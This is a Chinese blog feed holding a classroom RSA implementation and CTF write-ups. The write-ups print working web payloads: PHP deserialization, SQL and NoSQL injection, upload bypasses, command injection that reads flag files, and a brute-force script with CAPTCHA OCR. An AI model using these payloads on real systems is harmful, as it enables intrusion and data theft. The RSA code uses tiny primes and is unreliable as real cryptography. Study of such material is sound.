class="number">2</span>,n<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> fastMod(a,q,n)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"prime"</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,k):</span><br><span class="line">            <span class="keyword">if</span> fastMod(a,(<span class="number">2</span>**j)*q,n)==n<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"prime"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"composite"</span></span><br><span class="line"><span class="comment">#print(MillerPrime(166253697843677187137998267714778626751))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#欧几里得求逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    (x, y, r) = ext_euclid(b, a%b)</span><br><span class="line">    tmp = x</span><br><span class="line">    x = y</span><br><span class="line">    y = tmp - (a//b) * y</span><br><span class="line">    <span class="keyword">return</span> (x, y, r)</span><br><span class="line"><span class="comment">#print(ext_euclid(47,30))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求最大公因子</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatePrime</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        temp=random.randrange(<span class="number">2</span>**<span class="number">64</span>,<span class="number">2</span>**<span class="number">68</span>)</span><br><span class="line">        <span class="keyword">if</span> temp%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> MillerPrime(temp)==<span class="string">"composite"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateKey</span><span class="params">()</span>:</span></span><br><span class="line">    p=CreatePrime()</span><br><span class="line">    q=CreatePrime()</span><br><span class="line">    n=p * q</span><br><span class="line">    fn=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        temp=random.randrange(<span class="number">0</span>,<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(temp,fn)==<span class="number">1</span>:</span><br><span class="line">            e=temp</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    x,y,r=ext_euclid(fn,e)</span><br><span class="line">    d=y%fn</span><br><span class="line">    <span class="keyword">return</span> (n, e, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strtoint</span><span class="params">(message)</span>:</span></span><br><span class="line">    message = int(binascii.hexlify(message.encode(<span class="string">"utf-8"</span>)), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inttostr</span><span class="params">(num)</span>:</span></span><br><span class="line">    num=hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(num)%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">        num=<span class="string">'0'</span>+num</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(num.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> fastMod(m,e,n)</span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(c,d,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> fastMod(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    (n, e, d) = CreateKey()</span><br><span class="line">    print(<span class="string">"n:"</span>,n,<span class="string">"e:"</span>,e,<span class="string">"d:"</span>,d)</span><br><span class="line">    M1=strtoint(input(<span class="string">"输入明文:"</span>))</span><br><span class="line">    <span class="comment">#print(M1)</span></span><br><span class="line">    print(<span class="string">"加密:"</span>,Encrypt(M1,e,n))</span><br><span class="line">    print(<span class="string">"----------------------------------"</span>+<span class="string">"\n"</span>)</span><br><span class="line">    C2=int(input(<span class="string">"输入密文: "</span>))</span><br><span class="line">    M2=Decrypt(C2,d,n)</span><br><span class="line">    print(<span class="string">"解密: "</span>,inttostr(M2).decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  临近期末了，剩下Java和密码学两门课了，正好有密码学课程设计，借此机会记录自己写的算法，每写一个算法就当巩固之前的算法知识和信息安全数学基础的知识了。&lt;/p&gt;
&lt;h1 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>中原工比赛</title>
    <link href="http://yoursite.com/2018/12/24/%E4%B8%AD%E5%8E%9F%E7%90%86%E5%B7%A5writeup/"/>
    <id>http://yoursite.com/2018/12/24/中原理工writeup/</id>
    <published>2018-12-23T16:00:00.000Z</published>
    <updated>2018-12-24T09:39:01.203Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>查看响应头发现tips:4he9e.txt<br><img src="https://i.imgur.com/Nee638w.png" alt=""><br>然后访问之后有段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"***"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>strcmp传入数组与字符串比较时会返回0；<br>构造<code>?repo[]=1</code></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>常规上传<br>上传成功之后不回显路径。修改phtml,php5..等无果。<br>应该就是一个简单的黑名单检测。</p><p>最后使用pht绕过<br><img src="https://i.imgur.com/4Aytb8Q.png" alt=""></p><h1 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h1><p>代码审计<br>传参t得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span><br><span class="line">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后发现is_numeric()和int()。这里is_numeric检测变量是否为数字或数字字符串，可识别科学记数法，数字，十六进制。int不能处理十六进制。用科学记数法绕过<br><code>sleep=6e6</code></p><p><img src="https://i.imgur.com/dWIUjqY.png" alt=""></p><h1 id="惊鸿一笔，上官婉儿。"><a href="#惊鸿一笔，上官婉儿。" class="headerlink" title="惊鸿一笔，上官婉儿。"></a>惊鸿一笔，上官婉儿。</h1><p>测试诸如点的时候首先fuzz测试发现过滤了union,and等字符。<br>直接从information_schema爆库没有回显。<br>题目过滤掉了一般报错注入和关键词报错注</p><p>利用不常用函数<br><code>id=1 or exp(~id)</code></p><p>(exp此函数返回e(自然对数的底)到X次方的值)<br>报错出库名。<br>md5加密提交<br><img src="https://i.imgur.com/Ak1M6MO.png" alt=""></p><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现file_get_contents，由此想到php封装协议，请求方式时post可以使用php://input来获取原始请求的数据。<br>构造<br><code>http://39.106.148.174:8666?php://input</code></p><p>协议构造admin.</p><p>利用php://filter可以读取任意文件。php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。<br>参考<a href="https://www.leavesongs.com/penetration/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/penetration/php-filter-magic.html</a><br>这里学习了一些用法<br><code>readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</code></p><p>我们进行读取class.php文件可以构造<br><code>http://39.106.148.174:8666?php://input&amp;php://filter/convert.base64-encode/resource=class.php</code><br>读取到的内容base64解码之后获得<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"_toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>function _toString()</code>魔术方法，构造参数获得read类file变量。考察点php反序列化，<br>构造 <code>?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64_encode/resource=flag.php&quot;;}</code><br><img src="https://i.imgur.com/7FPw9Go.png" alt=""></p><p>base64解码得到flag;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;查看响应头发现tips:4he9e.txt&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/Nee638w.png&quot; al
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯12月月赛</title>
    <link href="http://yoursite.com/2018/12/22/%E5%AE%89%E6%81%9212%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://yoursite.com/2018/12/22/安恒12月月赛Writeup/</id>
    <published>2018-12-21T16:00:00.000Z</published>
    <updated>2018-12-23T04:11:26.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目源码。</p><p>主要利用点反序列化漏洞。 当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p><p><code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，需要先绕过这个匹配。参考博文<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a>将</p><p>故绕过payload<code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>将<code>O:4修改为O:+4</code></p><p>直接传值的话会，服务器接收到会把加号认为空格。</p><p>将+进行URL编码<br>最终payload:<code>O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><h1 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h1><p>在请求包中发现</p><p>user=dXNlcg解码发现是user，将admin用base64编码然后修改Cookie.</p><p>跳转到<img src="https://i.imgur.com/obFUyGt.png" alt=""></p><p>执行cmd命令</p><p>cmd=ls存在回显。尝试读文件在config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看到了检测机制。过滤了空格但是$/未过滤。<br>然后通过$IFS(bash中的内部域分隔符)进行bypass</p><p><img src="https://i.imgur.com/0KANGV4.png" alt=""><br>cmd=ls$IFS/  发现ffLAG_404<br>读取  <code>cmd=cat$IFS/ffLAG_404</code>读取flag;<br><img src="https://i.imgur.com/X7CZD1e.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;easy&quot;&gt;&lt;a href=&quot;#easy&quot; class=&quot;headerlink&quot; title=&quot;easy&quot;&gt;&lt;/a&gt;easy&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Swpuctf复现</title>
    <link href="http://yoursite.com/2018/12/22/Swpuctf_writeup/"/>
    <id>http://yoursite.com/2018/12/22/Swpuctf_writeup/</id>
    <published>2018-12-21T16:00:00.000Z</published>
    <updated>2018-12-23T06:07:41.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h1><ol><li>单引号里面的双引号中的变量不会解析！ </li><li>string substr ( string $string , int $start [, int $length ] )<br>如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略</li><li>@错误抑制符</li><li>rand() 和 mt_rand() 产生的最大随机数都是2147483647，为2^31-1,</li></ol><ol><li>注册登陆给了一个15位优惠码，提交验证码发现需要24位，学习到了预测种子，然后产生对应的24位优惠码。<br>御剑扫描发现后台<a href="http://www.zip，下载发现有生成优惠码源码和第二个页面验证代码。通过源码反推随机数，然后利用php_mt_seed进行种子预测。" target="_blank" rel="noopener">www.zip，下载发现有生成优惠码源码和第二个页面验证代码。通过源码反推随机数，然后利用php_mt_seed进行种子预测。</a></li></ol><p>(注意点：前8位对应$str_rand中的位置，便是随机数的结果，后7位对应的是反过来的位置)</p><p>工具参考<br><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a><br>首先利用脚本反推<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'KQtJTKbw58giTby'</span></span><br><span class="line"><span class="comment">#seed = 0x06bb6862 = 112945250 (PHP 7.1.0+)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=len(str2)/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i]==str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i]==str1[j]:</span><br><span class="line">                res+=str(len(str1)-j)+<span class="string">' '</span>+str(len(str1)-j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p><p>php_mt_seed 这个工具把产生的随机数作为参数,去爆破种子;<br><img src="https://i.imgur.com/dSaccZa.png" alt=""><br>然后修改soure.php中len为24，手动播种mt_srand()<br>mt_srand(569202727);<br>生成24位优惠码<code>KQtJTKbw52UShbyY3WlmmZgs</code><br>提交后通过验证</p><ol><li>Bypass绕过，/im m设置后“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后。只要匹配一个就会返回正确。</li></ol><p>首先是一个ip地址的匹配。用<code>%0a</code>绕过。</p><ol><li>第二层不能出现<code>flag \ cat echo</code>等字符。<br>需要 <code>c/at /fl\a\g</code>。进行绕过</li></ol><p>最后payload: <code>ip=1.0.0.1%0ac\at /f\la\g</code></p><h1 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h1><p>f12查看源码发现info.php,访问之后查看<br><img src="https://i.imgur.com/9PTqHcS.png" alt=""><br>mongo，由此可以想到mongo注入，然后抓包，进行测试<br><img src="https://i.imgur.com/5zceEat.png" alt=""><br>可以绕过，由此是Nosql注入。通过盲注进行测试，<br>最终payload<br><code>http://123.206.213.66:45678/check.php?username[$ne]=admin&amp;password[$regex]=^skmun&amp;vertify=kzd3</code></p><p>参考别人Writeup,用pytesseract可以进行验证码识别。学到姿势。<br>附上脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">string_list = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string_list:</span><br><span class="line">        res = s.get(<span class="string">'http://123.206.213.66:45678/vertify.php'</span>)</span><br><span class="line">        image_name = os.path.join(os.path.dirname(__file__),<span class="string">'yzm.jpg'</span>)</span><br><span class="line">        <span class="keyword">with</span> open(image_name, <span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(res.content)</span><br><span class="line">        image = Image.open(image_name)</span><br><span class="line">        code = pytesseract.image_to_string(image)</span><br><span class="line">        res = s.get(<span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'</span>+password + j +<span class="string">'&amp;vertify='</span>+code)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'CAPTCHA'</span> <span class="keyword">in</span> res.content):</span><br><span class="line">            res = s.get(<span class="string">'http://123.206.213.66:45678/vertify.php'</span>)</span><br><span class="line">            image_name = os.path.join(os.path.dirname(__file__),<span class="string">'yzm.jpg'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(image_name, <span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(res.content)</span><br><span class="line">            image = Image.open(image_name)</span><br><span class="line">            code = pytesseract.image_to_string(image)</span><br><span class="line">            res = s.get(<span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'</span>+password + j +<span class="string">'&amp;vertify='</span>+code)</span><br><span class="line">        <span class="keyword">print</span> password+j,res.content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nice!But it is not the real passwd'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            password += j</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'username or password incorrect'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">print</span> password</span><br></pre></td></tr></table></figure></p><h1 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h1><p>绝对路径:绝对路径又分为本地绝对路径和网络绝对路径.<br>相对路径 :相对于当前文件的路径 